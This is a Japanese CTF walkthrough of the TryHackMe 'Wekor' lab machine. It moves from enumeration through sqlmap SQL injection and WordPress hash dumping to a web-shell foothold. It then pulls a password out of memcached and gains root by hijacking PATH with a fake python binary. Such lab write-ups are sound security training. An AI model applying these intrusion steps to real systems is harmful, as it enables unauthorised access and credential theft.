# Wakor CTF

https://tryhackme.com/room/wekorra

## Enumeration

```shell
TARGET=10.201.104.151
sudo bash -c "echo $TARGET   wekor.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

SSH、HTTP

```sh
root@ip-10-201-15-231:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.104.151
+ Target Hostname:    wekor.thm
+ Target Port:        80
+ Start Time:         2025-10-28 01:31:31 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x17 0x5aa33ac47e480 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ File/dir '/comingreallysoon/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 9 entries which should be manually viewed.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ 1707 items checked: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-10-28 01:31:33 (GMT0) (2 seconds)
---------------------------------------------------------------------------
```

robots.txt は興味深い。

### ディレクトリ列挙

```sh
$ cat robots.txt 
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

## web

### /

トップページを表示すると、`Welcome Internet User!`と表示される。`X-Forwarded-For` か何かを参照していると思ったが、操作しても変化はなかった。

### /comingreallysoon

```
Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot !
```

### /it-next

ブログが表示された。WordPress ではない。

```sh
$ dirsearch -u http://wekor.thm/it-next/

[10:39:56] 301 -  311B  - /it-next/js  ->  http://wekor.thm/it-next/js/                                         
[10:41:05] 200 -    0B  - /it-next/config.php                               
[10:41:07] 500 -    0B  - /it-next/contact.php                              
[10:41:10] 301 -  312B  - /it-next/css  ->  http://wekor.thm/it-next/css/   
[10:41:22] 301 -  314B  - /it-next/fonts  ->  http://wekor.thm/it-next/fonts/
[10:41:29] 301 -  315B  - /it-next/images  ->  http://wekor.thm/it-next/images/
[10:41:29] 200 -  542B  - /it-next/images/
[10:41:34] 200 -  544B  - /it-next/js/ 
```

可能性があるとすればXSSか？

### サブドメイン、VHOST

siteが見つかった。

```shell
root@ip-10-201-15-231:~# ffuf -u http://wekor.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.wekor.thm' -fs 23

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://wekor.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.wekor.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 23
________________________________________________

site                    [Status: 200, Size: 143, Words: 27, Lines: 6]
:: Progress: [114532/114532] :: Job [1/1] :: 8094 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

### /site.wekor.thm

```
Hi there! Nothing here for now, but there should be an amazing website here in about 2 weeks, SO DON'T FORGET TO COME BACK IN 2 WEEKS! - Jim
```

dirsearch で、/wordpress を発見。

```
[01:51:32] 200 -    2KB - /wordpress/wp-login.php
[01:51:32] 200 -    3KB - /wordpress/
```

spscan 抜粋

```sh
$ wpscan --url http://site.wekor.thm/wordpress/ -e

[+] Upload directory has listing enabled: http://site.wekor.thm/wordpress/wp-content/uploads/

[+] WordPress version 5.6 identified (Insecure, released on 2020-12-08).

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://site.wekor.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

ブルートフォースしたが、10分でクラックできなかったので断念。

```sh
wpscan --url http://site.wekor.thm/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

他のところでパスワードを探す。

### sqli

### /it-next/it_contact.php?s=aaa

脆弱性なし

```sh
$ sqlmap -r ./contact.txt -p s --dbs --batch
```

### POST /it-next/it_cart.php

脆弱性発見。

```sh
$ sqlmap -r ./cart.txt --dbs --batch

[11:27:51] [INFO] fetching database names
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
```

```sh
$ sqlmap -r ./cart.txt -D wordpress --tables --batch

[11:29:55] [INFO] fetching tables for database: 'wordpress'
Database: wordpress
[12 tables]
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
```

パスワードハッシュ入手。

```sh
$ sqlmap -r ./cart.txt -D wordpress -T wp_users -C user_email,user_login,user_nicename,user_pass --dump --batch

[11:33:13] [INFO] cracked password 'xxxxxx' for user 'wp_eagle'                                                                                                                                                                          
Database: wordpress                                                                                                                                                                                                                      
Table: wp_users
[4 entries]
+-------------------+------------+---------------+---------------------------------------------+
| user_email        | user_login | user_nicename | user_pass                                   |
+-------------------+------------+---------------+---------------------------------------------+
| admin@wekor.thm   | admin      | admin         | $P$[REDACTED]          |
| jeffrey@wekor.thm | wp_jeffrey | wp_jeffrey    | $P$[REDACTED]          |
| yura@wekor.thm    | wp_yura    | wp_yura       | $P$[REDACTED]          |
| eagle@wekor.thm   | wp_eagle   | wp_eagle      | $P$[REDACTED]  |
+-------------------+------------+---------------+---------------------------------------------+
```

rockyou.txt で、admin以外のパスワードはクラックできた。

wp_yura で、WordPressに管理者としてログインできた。

404.phpを更新し、/wp-content/themes/twentytwentyone/404.php に直接アクセス。

シェル取得成功

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.104.151] 33594
Linux osboxes 4.15.0-132-generic #136~16.04.1-Ubuntu SMP Tue Jan 12 18:18:45 UTC 2021 i686 i686 i686 GNU/Linux
 22:46:09 up  1:17,  0 users,  load average: 0.00, 0.36, 2.42
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

/home/Orka に微妙なパーミッションが付いていて読めない。

```sh
www-data@osboxes:/$ ls -al /home
total 28
drwxr-xr-x  4 root root  4096 Jul 12  2020 .
drwxr-xr-x 23 root root  4096 Jan 23  2021 ..
drwxr-xr-- 18 Orka Orka  4096 Jan 26  2021 Orka
drwx------  2 root root 16384 Feb 28  2019 lost+found

www-data@osboxes:/$ cd /home/Orka
bash: cd: /home/Orka: Permission denied

www-data@osboxes:/$ ls -al /home/Orka
ls: cannot access '/home/Orka/.config': Permission denied
ls: cannot access '/home/Orka/Videos': Permission denied
ls: cannot access '/home/Orka/.nano': Permission denied
ls: cannot access '/home/Orka/.xsession-errors': Permission denied
ls: cannot access '/home/Orka/.profile': Permission denied
ls: cannot access '/home/Orka/Templates': Permission denied
ls: cannot access '/home/Orka/user.txt': Permission denied
ls: cannot access '/home/Orka/Music': Permission denied
ls: cannot access '/home/Orka/.bash_logout': Permission denied
ls: cannot access '/home/Orka/.': Permission denied
ls: cannot access '/home/Orka/..': Permission denied
ls: cannot access '/home/Orka/Pictures': Permission denied
ls: cannot access '/home/Orka/.bash_history': Permission denied
ls: cannot access '/home/Orka/.dmrc': Permission denied
ls: cannot access '/home/Orka/.local': Permission denied
ls: cannot access '/home/Orka/.bashrc': Permission denied
ls: cannot access '/home/Orka/.compiz': Permission denied
ls: cannot access '/home/Orka/.ICEauthority': Permission denied
ls: cannot access '/home/Orka/.gconf': Permission denied
ls: cannot access '/home/Orka/.mozilla': Permission denied
ls: cannot access '/home/Orka/Downloads': Permission denied
ls: cannot access '/home/Orka/Public': Permission denied
ls: cannot access '/home/Orka/.gnupg': Permission denied
ls: cannot access '/home/Orka/Documents': Permission denied
ls: cannot access '/home/Orka/.xsession-errors.old': Permission denied
ls: cannot access '/home/Orka/.cache': Permission denied
ls: cannot access '/home/Orka/Desktop': Permission denied
ls: cannot access '/home/Orka/.Xauthority': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
-????????? ? ? ? ?            ? .ICEauthority
-????????? ? ? ? ?            ? .Xauthority
-????????? ? ? ? ?            ? .bash_history
-????????? ? ? ? ?            ? .bash_logout
-????????? ? ? ? ?            ? .bashrc
d????????? ? ? ? ?            ? .cache
d????????? ? ? ? ?            ? .compiz
d????????? ? ? ? ?            ? .config
-????????? ? ? ? ?            ? .dmrc
d????????? ? ? ? ?            ? .gconf
d????????? ? ? ? ?            ? .gnupg
d????????? ? ? ? ?            ? .local
d????????? ? ? ? ?            ? .mozilla
d????????? ? ? ? ?            ? .nano
-????????? ? ? ? ?            ? .profile
-????????? ? ? ? ?            ? .xsession-errors
-????????? ? ? ? ?            ? .xsession-errors.old
d????????? ? ? ? ?            ? Desktop
d????????? ? ? ? ?            ? Documents
d????????? ? ? ? ?            ? Downloads
d????????? ? ? ? ?            ? Music
d????????? ? ? ? ?            ? Pictures
d????????? ? ? ? ?            ? Public
d????????? ? ? ? ?            ? Templates
d????????? ? ? ? ?            ? Videos
-????????? ? ? ? ?            ? user.txt
```

内部オープンポートを探す。

```sh
tcp    LISTEN     0      5                                                                               127.0.0.1:631                                                                                                 *:*                  
tcp    LISTEN     0      10                                                                              127.0.0.1:3010                                                                                                *:*                  
tcp    LISTEN     0      80                                                                              127.0.0.1:3306                                                                                                *:*                  
tcp    LISTEN     0      128                                                                             127.0.0.1:11211                                                                                               *:*                
```

トンネリング開始

```sh
www-data@osboxes:/tmp$ ssh -N -R 631:localhost:631 -R 3010:localhost:3010 -R 11211:localhost:11211 tunnel@10.11.146.32
```

nmap

```sh
┌──(kali㉿kali)-[~/ctf/wekor]
└─$ nmap -sV -p631,3010,11211 localhost
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 12:29 JST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000045s latency).
Other addresses for localhost (not scanned): ::1

PORT      STATE SERVICE   VERSION
631/tcp   open  ipp       CUPS 2.1
3010/tcp  open  gw?
11211/tcp open  memcached Memcached 1.4.25 (uptime 7281 seconds; Ubuntu)
```

このバージョンに対応する脆弱性は無い。

```sh
$ searchsploit cups 2.1
Exploits: No Results
Shellcodes: No Results

$ searchsploit memcached 1.4.25
Exploits: No Results
Shellcodes: No Results
```

memcached に接続

```sh
www-data@osboxes:/tmp$ telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
```

```sh
stats
STAT pid 937
STAT uptime 8298
STAT time 1761623218
STAT version 1.4.25 Ubuntu
STAT libevent 2.0.21-stable
STAT pointer_size 32
STAT rusage_user 0.218486
STAT rusage_system 0.000000
STAT curr_connections 1
STAT total_connections 32
STAT connection_structures 3
STAT reserved_fds 20
STAT cmd_get 0
STAT cmd_set 25
STAT cmd_flush 0
STAT cmd_touch 0
STAT get_hits 0
STAT get_misses 0
STAT delete_misses 0
STAT delete_hits 0
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT touch_hits 0
STAT touch_misses 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 15728
STAT bytes_written 5286
STAT limit_maxbytes 67108864
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT time_in_listen_disabled_us 0
STAT threads 4
STAT conn_yields 0
STAT hash_power_level 16
STAT hash_bytes 262144
STAT hash_is_expanding 0
STAT malloc_fails 0
STAT bytes 321
STAT curr_items 5
STAT total_items 25
STAT expired_unfetched 0
STAT evicted_unfetched 0
STAT evictions 0
STAT reclaimed 0
STAT crawler_reclaimed 0
STAT crawler_items_checked 0
STAT lrutail_reflocked 0
END
```

```sh
stats items
STAT items:1:number 5
STAT items:1:age 8329
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 0
STAT items:1:lrutail_reflocked 0
```

```sh
stats cachedump 1 100
ITEM id [4 b; 1761614860 s]
ITEM email [14 b; 1761614860 s]
ITEM salary [8 b; 1761614860 s]
ITEM password [15 b; 1761614860 s]
ITEM username [4 b; 1761614860 s]
END
```

Orka のパスワード発見。

```sh
get password
VALUE password 0 15
[REDACTED]
END
get username
VALUE username 0 4
Orka
```

昇格成功

```sh
www-data@osboxes:/tmp$ su Orka
Password: 
Orka@osboxes:/tmp$ 
```

## 権限昇格２

/home/Orka/Desktop/bitcoin をrootで実行可能。

```sh
Orka@osboxes:~$ sudo -l
[sudo] password for Orka: 
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```

リバース

```c
undefined4 main(void)
{
  int iVar1;
  ushort **ppuVar2;
  int in_GS_OFFSET;
  char local_88;
  char local_87 [15];
  char local_78 [100];
  int local_14;
  undefined1 *local_c;
  
  local_c = &stack0x00000004;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Enter the password : ");
  gets(local_87);
  iVar1 = strcmp(local_87,"password");
  if (iVar1 == 0) {
    puts("Access Granted...");
    sleep(1);
    puts("\t\t\tUser Manual:\t\t\t");
    puts("Maximum Amount Of BitCoins Possible To Transfer at a time : 9 ");
    puts("Amounts with more than one number will be stripped off! ");
    puts("And Lastly, be careful, everything is logged :) ");
    printf("Amount Of BitCoins : ");
    __isoc99_scanf(&DAT_0804893b,&local_88);
    ppuVar2 = __ctype_b_loc();
    if (((*ppuVar2)[local_88] & 0x800) == 0) {
      puts("\n Sorry, This is not a valid amount! ");
    }
    else {
      sprintf(local_78,"python /home/Orka/Desktop/transfer.py %c",(int)local_88);
      system(local_78);
    }
  }
  else {
    puts("Access Denied... ");
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```sh
Orka@osboxes:~$ ls -al /home/Orka/Desktop/transfer.py
-rwxr--r-- 1 root root 588 Jan 23  2021 /home/Orka/Desktop/transfer.py
```

```python
Orka@osboxes:~$ cat /home/Orka/Desktop/transfer.py
import time
import socket
import sys
import os

result = sys.argv[1]

print "Saving " + result + " BitCoin(s) For Later Use "

test = raw_input("Do you want to make a transfer? Y/N : ")

if test == "Y":
        try:
                print "Transfering " + result + " BitCoin(s) "
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                connect = s.connect(("127.0.0.1",3010))
                s.send("Transfer : " + result + "To https://transfer.bitcoins.com")
                time.sleep(2.5)
                print ("Transfer Completed Successfully...")
                time.sleep(1)
                s.close()
        except:
                print("Error!")
else:
        print("Quitting...")
        time.sleep(1)
```

- パスワードは password
- 転送Bitcoin数は適当で良い
- socket.connect() を置き換えできれば任意のコードを実行できる
- python コマンドも相対パスになっている

socket.py の置き換えは、Desktop に書き込み権限がないため失敗した。

書き込み可能ディレクトリを確認すると、/usr/sbin にファイル書き込みできる。

```sh
Orka@osboxes:~$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
...
usr/sbin
...
```

/usr/bin/python より、/usr/sbin/python の方が優先順位が高くなる。

```
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
```

配置。

```sh
Orka@osboxes:~$ nano /usr/sbin/python
Orka@osboxes:~$ chmod +x /usr/sbin/python
```

リバースシェル取得成功

```sh
$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.104.151] 37710
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -al /root
total 48
drwx------  5 root root 4096 Jan 26  2021 .
drwxr-xr-x 23 root root 4096 Jan 23  2021 ..
-rw-------  1 root root    0 Jan 23  2021 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  3 root root 4096 Jan 23  2021 .cache
-rwxr-xr-x  1 root root  289 Jan 22  2021 cache.php
-rw-------  1 root root  144 Jan 26  2021 .mysql_history
drwxr-xr-x  2 root root 4096 Jan 21  2021 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Jul 12  2020 root.txt
-rwxr-xr-x  1 root root  679 Jan 23  2021 server.py
drwxr-xr-x  2 root root 4096 Jul 12  2020 .ssh
-rw-r--r--  1 root root   25 Jan 21  2021 wordpress_admin.txt
```

## 振り返り

- 要素が盛りだくさんで非常に良い練習になった
- memcached は初見で良い勉強になった
- 書き込み可能ディレクトリを確認する重要性
